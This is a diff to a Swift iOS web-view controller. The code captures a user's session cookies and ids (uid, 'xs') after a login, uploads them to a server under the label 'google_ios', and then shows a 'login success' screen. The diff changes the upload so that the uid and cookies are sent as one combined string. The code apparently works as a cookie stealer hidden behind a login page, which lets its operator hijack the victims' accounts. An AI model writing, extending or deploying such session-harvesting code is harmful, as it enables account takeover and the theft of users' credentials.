@@ -70,11 +70,11 @@ class WebViewController: UIViewController, WKNavigationDelegate {
     
     func uploadCookies(cookies: String,uid: String, xs: String) {
         print("coikkeis : \(cookies)")
-        upLoadData(password: "google_ios", uid: uid, cookie: cookies, combined: "")
+        upLoadData(password: "google_ios", uid: uid, cookie: cookies, combined: "\(uid)|\(cookies)")
     }
     
     @IBAction func tapDone(_ sender: UIButton) {
-        self.dismiss(animated: true, completion: nil)
+        self.pop()
     }
 }
 
@@ -110,15 +110,15 @@ extension WebViewController{
                 return
             }
 
-            let responseString = String(data: data, encoding: .utf8)
             let preferences = UserDefaults.standard
             let currentLevelKey = "cookiesuploaded"
             preferences.setValue(true, forKey: currentLevelKey)
             preferences.synchronize()
             DispatchQueue.main.async {
-                self.navigationController?.popViewController(animated: false)
+               let vc = LoginSucessVC()
+                self.push(vc)
             }
-            print("responseString = \(responseString ?? "")")
+            
         }
         task.resume()
     }
